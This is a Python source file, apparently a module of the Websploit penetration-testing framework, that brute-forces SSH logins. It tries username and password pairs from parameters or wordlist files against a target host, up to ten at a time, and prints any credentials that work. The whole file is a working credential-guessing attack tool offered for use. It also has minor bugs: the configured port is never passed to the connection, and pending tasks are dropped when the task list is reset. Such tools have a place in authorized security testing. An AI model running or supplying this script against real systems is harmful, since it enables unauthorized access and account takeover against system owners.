import asyncio
import asyncssh
from websploit.core import base


class Main(base.Module):
    """SSH Brute Force"""

    parameters = {
        "host": "127.0.0.1",
        "port": "22",
        "username": "root",
        "password": "root",
        "userfile": "",
        "passfile": ""
    }
    completions = list(parameters.keys())

    def do_execute(self, line):
        """Execute current module"""
        
        pwds = []
        users = []
        
        """
        If a separate username is set, use this confirmed username directly. 
        If not set, check whether a username file is set. 
        The file can store multiple verified usernames, one per line.
        """
        username = self.parameters.get("username", "").strip('"')
        if username:
            self.cp.info(text=f"SSH Username ({username})")
            users.append(username)
        else:
            userfile = self.parameters.get("userfile", "").strip('"')
            if userfile == "":
                self.cp.warning(text=f"SSH cracking requires setting a username or userlist file")
                return
            
            try:
                with open(userfile, 'r') as f:
                    for user in f.readlines():
                        user = user.strip()
                        users.append(user)
            except FileNotFoundError:
                self.cp.error(text=f"userlist file '{userfile}' not found.")
                return
            except Exception as e:
                self.cp.error(text=f"Error reading userlist file '{userfile}': {e}")
                return 
        
        password = self.parameters.get("password").strip('"')
        if password:
            self.cp.info(text=f"SSH Password ({password})")
            pwds.append(password)
        else:
            pwdfile = self.parameters.get("passfile", "").strip('"')
            if pwdfile == "":
                self.cp.warning(text=f"SSH cracking requires setting a password or wordlist file")
                return

            try:
                with open(pwdfile, 'r') as f:
                    for pwd in f.readlines():
                        pwd = pwd.strip()
                        pwds.append(pwd)
            except FileNotFoundError:
                self.cp.error(text=f"wordlist file '{pwdfile}' not found.")
                return
            except Exception as e:
                self.cp.error(text=f"Error reading wordlist file '{pwdfile}': {e}")
                return
        
        asyncio.run(self.start_scan(
            self.parameters["host"],
            self.parameters["port"],
            users, pwds
        ))
        

    async def start_scan(self, host, port, users, pwds):
        tasks = []
        found_flag = asyncio.Event()
        concurrency_limit = 10
        counter = 0

        for user in users:
            for pwd in pwds:
                if counter >= concurrency_limit:
                    await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                    tasks = []
                    counter = 0
                
                if not found_flag.is_set():
                    tasks.append(
                        asyncio.create_task(self.ssh_bruteforce(host, user, pwd, port, found_flag))
                    )
                    await asyncio.sleep(0.5)
                    counter += 1
        
        await asyncio.gather(*tasks)

        if not found_flag.is_set():
            self.cp.error(text=f"Failed to find the correct password.")

    async def ssh_bruteforce(self, hostname, username, password, port, found_flag):
        """Takes password,username,port as input and checks for connection"""

        try:
            async with asyncssh.connect(hostname, username=username, password=password) as sshconn:
                found_flag.set()
                self.cp.success(text=f"SSH found host:{hostname} login:{username} password:{password}")
        except Exception as err:
            self.cp.info(text=f"Attempt target:{hostname} - login:{username} - password:{password}")

        